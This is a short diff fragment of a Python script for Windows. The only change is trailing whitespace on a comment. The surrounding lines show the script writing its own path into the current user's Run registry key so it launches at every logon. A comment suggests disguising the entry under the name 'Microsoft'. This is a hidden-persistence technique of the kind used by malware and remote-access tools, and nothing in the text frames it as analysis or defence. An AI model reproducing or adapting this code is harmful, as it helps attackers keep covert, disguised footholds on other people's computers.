@@ -5,7 +5,7 @@ import subprocess
 import ctypes
 import os
 import winreg;
-file_path = os.path.realpath(__file__) #<Retrieves file path of where script is running from.
+file_path = os.path.realpath(__file__) #<Retrieves file path of where script is running from. 
 key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
 r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0,
 winreg.KEY_SET_VALUE); winreg.SetValueEx(key, 'Microsoft', 0,  #<Adds to startup through registry. You can change 'Microsoft' to whatever registry name you want displayed.
